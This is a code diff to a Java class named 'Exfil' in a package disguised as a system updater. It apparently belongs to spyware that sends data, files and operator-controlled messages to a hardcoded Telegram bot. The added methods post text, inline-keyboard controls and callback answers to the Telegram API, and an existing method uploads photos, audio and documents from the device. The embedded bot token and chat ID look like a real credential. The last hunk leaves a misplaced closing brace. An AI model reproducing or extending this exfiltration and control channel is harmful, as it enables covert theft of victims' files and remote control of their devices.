@@ -1,5 +1,6 @@
 package com.sys.updater;
 
+import org.json.JSONObject;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -12,6 +13,7 @@ public class Exfil {
     public static final String BOT_TOKEN = "8624726401:AAF0OfA_I0vxNPkeEucmLFCU6CBff7ynbUk"; // <--- BEDEL
     public static final String CHAT_ID = "8431994335"; // <--- BEDEL
 
+    // 1. Send normal text
     public static void send(String text) {
         new Thread(() -> {
             try {
@@ -20,7 +22,46 @@ public class Exfil {
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
-                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
+                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(postData.getBytes());
+                }
+                conn.getInputStream().close();
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
+    }
+
+    // 2. Send text with Inline Keyboard
+    public static void sendWithMarkup(String text, String jsonMarkup) {
+        new Thread(() -> {
+            try {
+                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                String postData = "chat_id=" + CHAT_ID + 
+                                  "&text=" + URLEncoder.encode(text, "UTF-8") + 
+                                  "&parse_mode=HTML" +
+                                  "&reply_markup=" + URLEncoder.encode(jsonMarkup, "UTF-8");
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(postData.getBytes());
+                }
+                conn.getInputStream().close();
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
+    }
+
+    // 3. Answer Callback (to remove loading icon on button)
+    public static void answerCallback(String callbackId, String text) {
+        new Thread(() -> {
+            try {
+                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery";
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                String postData = "callback_query_id=" + callbackId + "&text=" + URLEncoder.encode(text, "UTF-8");
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(postData.getBytes());
                 }
@@ -29,6 +70,7 @@ public class Exfil {
         }).start();
     }
     
+    // 4. Send File (Photo, Audio, Document)
     public static void sendFile(String filePath, String type, String caption) {
         new Thread(() -> {
             try {
@@ -59,4 +101,4 @@ public class Exfil {
             } catch (Exception e) { e.printStackTrace(); }
         }).start();
     }
-}
+                }
